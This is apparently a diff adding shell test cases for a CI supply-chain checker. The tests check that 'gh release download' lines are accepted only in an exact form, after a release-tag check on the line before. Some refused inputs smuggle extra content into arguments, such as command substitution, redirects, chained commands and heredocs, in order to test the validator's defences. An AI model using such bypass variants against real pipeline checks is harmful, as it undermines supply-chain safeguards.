+# --- AC19 amendment (advisor, Oct 10 step 5): the authenticated draft download, host repo:self. The line is EXACTLY
+# gh release download "$ver" --repo "$GITHUB_REPOSITORY" with one or more -p NAME (a literal exact asset name) and at most one -D PATH (a literal path),
+# on one physical line; the line IMMEDIATELY before it in the same step checks $ver against the release tag pattern and exits when it does not match
+# ([[ "$ver" =~ RE ]] || exit N; [[ "$ver" =~ RE ]] || { echo MSG >&2; exit N; }; if [[ ! "$ver" =~ RE ]]; then [echo MSG >&2; ]exit N; fi, RE one of
+# ^v[0-9]+\.[0-9]+\.[0-9]+$ and ^v[0-9]+\.[0-9]+\.[0-9]+(-rc\.[0-9]+)?$, unquoted); no heredoc and no unbalanced quote before it in the step.
+GHD='gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p manifest.json -p checksums.txt -D dist/draft'
+CHK='[[ "$ver" =~ ^v[0-9]+\.[0-9]+\.[0-9]+(-rc\.[0-9]+)?$ ]] || exit 1'
+ghcase() { # STEP-TEXT-BEFORE DOWNLOAD-LINE EXPECTED-RC WHY [FILE]: bin/rel.sh (or FILE) = a preamble, STEP-TEXT-BEFORE, the download line
+  local f=${5:-bin/rel.sh}
+  ifrepo ifg "${SUPPORT[@]}" head "$f" $'#!/bin/bash\nset -eu\nver=$1\n'"$1$2"$'\n'
+  ifx "$work/if-g.json" plain "$(ifrow "$f" "$2" repo:self)"; ifck ifg "$work/if-g.json"
+  CASE="AC19 (repo:self): $4: exit $3"
+  check test "$rc" -eq "$3"
+  if [ "$3" -eq 0 ]; then check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 1; else check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 0; fi
+}
+ghcase "$CHK"$'\n' "$GHD" 0 'control: the tag check on the line before, two literal -p names and a literal -D pass'
+ghcase '[[ $ver =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]] || { echo "not a release tag: $ver" >&2; exit 2; }'$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p manifest.json' 0 'control: the { echo MSG >&2; exit N; } form, the plain-release pattern and one -p pass'
+ghcase 'if [[ ! "$ver" =~ ^v[0-9]+\.[0-9]+\.[0-9]+(-rc\.[0-9]+)?$ ]]; then echo "bad tag" >&2; exit 1; fi'$'\n' "$GHD" 0 'control: the if [[ ! ... ]]; then ... exit N; fi form passes'
+ghcase "$CHK"$'\n' 'gh release download "$ver" --repo other/repo -p manifest.json' 1 'a literal repository (--repo other/repo) is refused'
+ghcase "$CHK"$'\n' 'gh release download "$ver" --repo "$X" -p manifest.json' 1 'another repository variable (--repo "$X") is refused'
+ghcase "$CHK"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" --repo other/repo -p manifest.json' 1 'a second --repo is refused'
+ghcase "$CHK"$'\n' 'gh release download "$ver" --repo="$GITHUB_REPOSITORY" -p manifest.json' 1 '--repo=VALUE (not the exact form) is refused'
+ghcase "$CHK"$'\n' 'gh release download "$ver" -p manifest.json' 1 'no --repo is refused'
+ghcase "$CHK"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p '"'*.json'" 1 "a glob in -p ('*.json') is refused"
+ghcase "$CHK"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p manifest.{json,sig}' 1 'a brace in -p is refused'
+ghcase "$CHK"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p "$asset"' 1 'a variable in -p is refused'
+ghcase "$CHK"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY"' 1 'a missing -p is refused'
+ghcase "$CHK"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" --archive tar.gz' 1 '--archive is refused'
+ghcase "$CHK"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p manifest.json --clobber' 1 'an extra flag (--clobber) is refused'
+ghcase "$CHK"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p manifest.json -D "$d"' 1 'a non-literal -D path ("$d") is refused'
+ghcase "$CHK"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p manifest.json -D a -D b' 1 'a second -D is refused'
+ghcase "$CHK"$'\n' 'gh release download "$tag" --repo "$GITHUB_REPOSITORY" -p manifest.json' 1 'another tag variable ("$tag") is refused'
+ghcase "$CHK"$'\n' 'gh release download $ver --repo "$GITHUB_REPOSITORY" -p manifest.json' 1 'the tag unquoted ($ver) is refused'
+ghcase "$CHK"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p manifest.json >"$log"' 1 'a redirect after the command is refused'
+ghcase "$CHK"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p manifest.json && echo ok' 1 'another command on the line is refused'
+ghcase '' "$GHD" 1 '$ver unchecked (no tag-pattern test in the step) is refused'
+ghcase "$CHK"$'\necho fetching\n' "$GHD" 1 'a tag check that is not the line IMMEDIATELY before the download is refused'
+ghcase '' "$GHD"$'\n'"$CHK" 1 'a tag check AFTER the download is refused'
+ghcase '[[ "$ver" =~ "^v[0-9]+\.[0-9]+\.[0-9]+$" ]] || exit 1'$'\n' "$GHD" 1 'a QUOTED pattern (a literal string match in bash) is refused'
+ghcase '[[ "$ver" =~ ^v.*$ ]] || exit 1'$'\n' "$GHD" 1 'a loose pattern (^v.*$) is refused'
+ghcase '[[ "$ver" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]] || true'$'\n' "$GHD" 1 'a check that does not exit (|| true) is refused'
+ghcase '[[ "$tag" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]] || exit 1'$'\n' "$GHD" 1 'a check of another variable is refused'
+ghcase $'cat <<\'EOF\'\n'"$CHK"$'\nEOF\n'"$CHK"$'\n' "$GHD" 1 'a heredoc before the download in the step (the check could be data) is refused'
+ghcase $'echo \\\n'"$CHK"$'\n' "$GHD" 1 'a check line that continues the line before it (an argument of echo) is refused'
+ghcase $'echo "\n'"$CHK"$'\n' "$GHD" 1 'an unbalanced quote before the check (the check could be inside a string) is refused'
+ghcase "$CHK"$'\n' $'gh release download "$ver" \\\n--repo "$GITHUB_REPOSITORY" -p manifest.json' 1 'a download joined from a backslash-newline continuation is refused'
+# a -p name may hold ${ver} (the coordinator's reading of the amendment, Oct 10): $ver is checked against the tag pattern on the line before, so the expanded
+# name holds no glob; ${ver} is the ONLY expansion a -p value may hold, braced and inside double quotes. The real line and check of pull request 276:
+GH276='gh release download "$ver" --repo "$GITHUB_REPOSITORY" -D /tmp/release-files-draft -p release-files.sha256 -p release-files.sha256.bundle -p release-manifest.json -p fosterstack-cache.openvex.json -p "fosterstack-cache-${ver}.csaf.json" -p "fosterstack-cache-${ver}.inspector-filters.json"'
+CHK276='[[ "$ver" =~ ^v[0-9]+\.[0-9]+\.[0-9]+(-rc\.[0-9]+)?$ ]] || { echo "::error::unexpected release tag" >&2; exit 1; }'
+ghcase "$CHK276"$'\n' "$GH276" 0 'control: the line and the check of pull request 276 (-p names holding ${ver}) pass'
+ghcase '' "$GH276" 1 'the line of pull request 276 with no tag check before it is refused'
+ghcase 'echo checking'$'\n' "$GH276" 1 'the line of pull request 276 with something other than the tag check before it is refused'
+ghcase "$CHK276"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p "fosterstack-cache-${other}.csaf.json"' 1 'a -p name holding another variable (${other}) is refused'
+ghcase "$CHK276"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p "fosterstack-cache-${ver}*.json"' 1 'a -p name holding ${ver} AND a glob is refused'
+ghcase "$CHK276"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p fosterstack-cache-${ver}.csaf.json' 1 'a -p name holding ${ver} without double quotes is refused'
+ghcase "$CHK276"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p "fosterstack-cache-$ver.csaf.json"' 1 'a -p name holding an unbraced $ver is refused'
+ghcase "$CHK276"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p "fosterstack-cache-${ver:-x}.csaf.json"' 1 'a -p name holding a parameter expansion of ver (${ver:-x}) is refused'
+ghcase "$CHK276"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p "$(echo x).json"' 1 'a -p name holding a command substitution is refused'
+ghcase "$CHK276"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p "manifest.json"' 0 'control: a quoted literal -p name passes'
+# the same in a workflow: the step is the run: block that holds the line
+wf() { printf 'on: workflow_dispatch\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |-\n          ver=x\n%s      - run: |\n%s\n' "$1" "$2"; }   # |- : the first step ends with no newline
+ghwf() { # FIRST-STEP-LINES SECOND-STEP-LINES EXPECTED-RC WHY
+  ifrepo ifw "${SUPPORT[@]}" head .github/workflows/rel.yml "$(wf "$1" "$2")"
+  ifx "$work/if-w.json" plain "$(ifrow .github/workflows/rel.yml "$GHD" repo:self)"; ifck ifw "$work/if-w.json"
+  CASE="AC19 (repo:self, workflow): $4: exit $3"
+  check test "$rc" -eq "$3"
+}
+ghwf '' "          $CHK"$'\n'"          $GHD" 0 'control: the check on the line before, in the same run: step, passes'
+ghwf "          $CHK"$'\n' "          $GHD" 1 'the check as the LAST line of ANOTHER step is refused'
+CASE="AC19 (repo:self, workflow): the other-step fixture parses as YAML, its first step ENDS with the check (no newline) and the second holds only the download"
+check python3 -c "import sys,yaml; s=yaml.safe_load(open(sys.argv[1]))['jobs']['j']['steps']; assert s[0]['run'].endswith(sys.argv[2]) and s[1]['run'].strip()==sys.argv[3], s" "$work/ifw/.github/workflows/rel.yml" "$CHK" "$GHD"
+ghwf '' "          $GHD" 1 'no check in the step is refused'
+for ov in '{"host": "repo:other"}' '{"host": "repo:"}' '{"form": "a download"}'; do
+  ifx "$work/if-bad.json" plain "$(ifrow bin/rel.sh "$GHD" repo:self "$ov")"; ifck ifm "$work/if-bad.json"
+  CASE="AC19 (repo:self): a malformed row ($ov) stops the check fail-closed: exit 2, names the list"
+  check test "$rc" -eq 2; check grep -q 'unmeasured_input_fetch' "$work/if.out"
+done
+ifx "$work/if-bad.json" plain "$(ifrow bin/fetch.sh "$LIT" repo:self)"; ifck ifm "$work/if-bad.json"
+CASE="AC19 (repo:self): host repo:self on a curl download (form 'a download') stops the check: exit 2"
+check test "$rc" -eq 2
+ifx "$work/if-bad.json" plain "$(ifrow bin/rel.sh "$GHD" "$HOSTN")"; ifck ifm "$work/if-bad.json"
+CASE="AC19 (repo:self): a gh release download row with a host other than repo:self stops the check: exit 2"
+check test "$rc" -eq 2
+CASE="AC19: the committed exceptions file holds an unmeasured_input_fetch list (empty in this change) that loads, and its format note"
+check python3 - "$chk" "$root/.github/supply-chain-exceptions.json" <<'PY'
+import importlib.util, json, sys
+spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
+d = json.load(open(sys.argv[2]))
+assert d["unmeasured_input_fetch"] == [] and ac.load_input_fetch(sys.argv[2], required=True) == {}, d.get("unmeasured_input_fetch")
+assert "REQ-SUP-001-AC19" in d["_format_unmeasured_input_fetch"]
 PY
 
 # --- live mode (no fixtures) against a stub gh: a rate limit is "could not look" (exit 2), a 404 is "no proof" (exit 1); neither is ever a pass -------------------------
